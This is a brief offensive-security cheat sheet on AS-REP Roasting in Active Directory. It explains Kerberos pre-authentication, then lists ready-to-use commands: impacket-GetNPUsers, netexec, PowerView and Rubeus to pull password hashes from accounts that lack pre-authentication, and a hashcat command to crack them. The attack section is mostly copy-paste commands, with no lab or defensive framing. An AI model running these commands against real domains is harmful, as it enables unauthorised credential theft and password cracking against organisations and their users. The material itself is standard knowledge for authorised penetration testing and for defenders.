# AS-REP Roasting

The Kerberos authentication protocol works with tickets in order to grant access. A ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to ASREProast).

The pre-authentication requires the requesting user to supply its secret key (DES, RC4, AES128 or AES256) derived from the user password. Technically, when asking the KDC (Key Distribution Center) for a TGT (Ticket Granting Ticket), the requesting user needs to validate pre-authentication by sending a timestamp encrypted with it's own credentials. It ensures the user is requesting a TGT for himself. Once validated, the TGT is then sent to the user in the `KRB_AS_REP` message, but that message also contains a session key. That session key is encrypted with the requested user's NT hash.

{% tabs %}
{% tab title="Linux" %}
```shellscript
# Using a userlist, check if any as vulnerable to AS-REP Roast
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -no-pass -usersfile <USER_LIST>

# AS-REP Roast a specific user
impacket-GetNPUsers -dc-ip <DC_IP> -no-pass <DOMAIN>/<USER>

# Using netexec, we need valid credentials => will test all users and get hashes
nxc ldap <IP> -u <USER> -p <PASSWORD> --asreproast output
```
{% endtab %}

{% tab title="Windows" %}
<pre class="language-shellscript"><code class="lang-shellscript"><strong># Using powerview, list as-rep roastable users
</strong><strong># The option might have changed to -KerberosPreauthNotRequired. Need to test
</strong>Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Using rubeus, extract the hash for all vulnerable users
.\Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt

# Specific user
.\Rubeus.exe asreproast /user:&#x3C;USER> /nowrap /format:hashcat
</code></pre>
{% endtab %}
{% endtabs %}

Crack the obtained hash

```shellscript
hashcat -m 18200 <HASH> <WORDLIST>
```
